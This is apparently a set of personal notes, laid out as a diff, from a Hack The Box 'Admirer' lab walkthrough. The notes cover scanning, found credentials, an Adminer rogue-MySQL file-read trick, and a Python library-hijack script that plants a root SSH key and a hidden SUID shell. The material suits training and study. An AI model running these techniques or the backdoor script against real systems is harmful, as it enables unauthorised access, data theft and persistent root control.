@@ -1,0 +1,222 @@
+1. let's enumerate first
+command: sudo rustscan -a 10.10.10.187 
+result:
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 21,22,80 10.10.10.187
+result:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
+|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
+|_  256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 4.8 (94%), Linux 4.4 (94%), Linux 4.9 (94%), Android 4.0 (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.187/
+access: http://10.10.10.187/robots.txt
+access: http://10.10.10.187/admin-dir/
+forbidden
+
+command: gobuster dir -u http://10.10.10.187 -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 20 
+result:
+===============================================================
+2023/06/18 22:17:18 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 313] [--> http://10.10.10.187/images/]
+/index.php            (Status: 200) [Size: 6051]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.10.187/assets/]
+/.php                 (Status: 403) [Size: 277]
+/.php                 (Status: 403) [Size: 277]
+/server-status        (Status: 403) [Size: 277]
+Progress: 265242 / 441122 (60.13%)^C
+[!] Keyboard interrupt detected, terminating.
+
+===============================================================
+2023/06/18 22:27:48 Finished
+===============================================================
+
+command: gobuster dir -u http://10.10.10.187/admin-dir -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20 
+result:
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.187/admin-dir
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              php,txt,zip,html
+[+] Timeout:                 10s
+===============================================================
+2023/06/18 22:19:15 Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 277]
+/.html                (Status: 403) [Size: 277]
+/contacts.txt         (Status: 200) [Size: 350]
+/.php                 (Status: 403) [Size: 277]
+/.html                (Status: 403) [Size: 277]
+/credentials.txt      (Status: 200) [Size: 136]
+
+access: http://10.10.10.187/admin-dir/contacts.txt
+result:
+##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+
+access: http://10.10.10.187/admin-dir/credentials.txt
+result:
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+
+command: wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187
+command: cd 10.10.10.187
+command: tar ztf html.tar.gz --exclude "*/*"
+assets/
+images/
+index.php
+robots.txt
+utility-scripts/
+w4ld0s_s3cr3t_d1r/
+
+unzip html.tar.gz
+
+command: ls utility-scripts 
+admin_tasks.php  db_admin.php  info.php  phptest.php
+
+command: cat db_admin.php               
+<?php
+  $servername = "localhost";
+  $username = "waldo";
+  $password = "Wh3r3_1s_w4ld0?";
+
+  // Create connection
+  $conn = new mysqli($servername, $username, $password);
+
+  // Check connection
+  if ($conn->connect_error) {
+      die("Connection failed: " . $conn->connect_error);
+  }
+  echo "Connected successfully";
+
+
+  // TODO: Finish implementing this or find a better open source alternative
+?>
+
+let's access: http://10.10.10.187/utility-scripts/adminer.php
+
+install mysql-webserver 
+mysql> CREATE DATABASE pwn;
+mysql> use pwn;
+mysql> CREATE TABLE exfil (data VARCHAR(256));
+
+access: http://10.10.10.187/utility-scripts/adminer.php
+server: 10.10.16.5
+username: root
+password: root
+database: pwn
+
+query: 
+LOAD DATA LOCAL INFILE '/etc/passwd'
+INTO TABLE pwn.exfil
+FIELDS TERMINATED BY '\n';
+result: Error in query (2000): open_basedir restriction in effect. Unable to open file 
+
+query: 
+LOAD DATA LOCAL INFILE '/var/www/html/index.php'
+INTO TABLE pwn.exfil
+FIELDS TERMINATED BY '\n';
+result: Query executed OK, 123 rows affected. (0.208 s) 
+
+query: 
+select * from pwn.exfil;
+take attention:
+$username = "waldo";
+$password = "&<h5b~yK3F#{PaPB&dA}{H>";
+
+command: ssh waldo@10.10.10.187
+password: &<h5b~yK3F#{PaPB&dA}{H>
+
+command: sudo -l
+result:
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+
+let's create out python exploit:
+#!/usr/bin/python3
+
+import os
+
+def make_archive(a,b,c):
+    pass
+
+os.system("mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9Ad16VdWJkStlEV+Rvh8v3NfegFnIW3mgi+LoBtvqqa20XusLIMmbP0z7MuwfDjpnEtBo76izt9JJAUvtrfk5mrzaKVmvAXZuOyGUHSPV+vvU8CJvHwiOwg9WbG/0LQJMh6uM+Zg/qoRg0aeGZ8nm2zBVpkU8dAbFPV0ExTgakndH1NA8R34M7H6Oqa4DGwaHp3IjxrVEGU3EjsMe6k5kYDOhmZc3NyzLq1UoNM7y9O4Ne1t5TFrkr9/lFXOd8gxVHJL5bsUY8/GtYqihksLWJdhj2sgs6sax83Qtd8kMXOQW/so6U6jlms+6JeOHf3lxs+vFOq56Gyu4EikqrULdpATlJdiN+D5vY8lpzo93rXN5GjXwQofxcb82oxb2yh6jzf/gUJDox4XI3mQCM9zzkotoOTeN642xNrtMTqx09oGtxVFFAZnxi/zb9rhs/L6P3a1C5pKEyEV9wNDRotGUkXlw0EyTD0oxNE3ADM49sS291aYxL7QdsnRQxi2tEMT1GUkdUmM6y1T0MUnmfoa/5jaEhfIrJaHZlvhP3FlCClqhSxc7460At9ZOkqlibgspeYb3vj/t+9pkTlQj5F+oKV0Nit5tFGYrOAHbjYv6A6NDa7PDrgcM+WE+3zyIecEu4KSfbCuh2OyOpyk73BgHolyuiPweTenUtt5tentb4Q== root@kali.com' >> /root/.ssh/authorized_keys")
+os.system('cp /bin/bash /var/tmp/.0xdf; chown root:root /var/tmp/.0xdf; chmod 4755 /var/tmp/.0xdf')
+
+upload to target machine and put on /var/tmp
+change name to shutil.py
+command: mv custome_exploit.py shutil.py
+command: sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
+Running backup script in the background, it might take a while...
+
+command: cd ~/.ssh
+command: ssh -i id_rsa_new.pub root@10.10.10.187
+command: cat /root/root.txt
+result:
+a3201a6eeed12e6358b53f8124211898
+
+resource: 
+https://0xdf.gitlab.io/2020/09/26/htb-admirer.html#priv-waldo--root
+https://fmash16.github.io/content/writeups/hackthebox/htb-Admirer.html
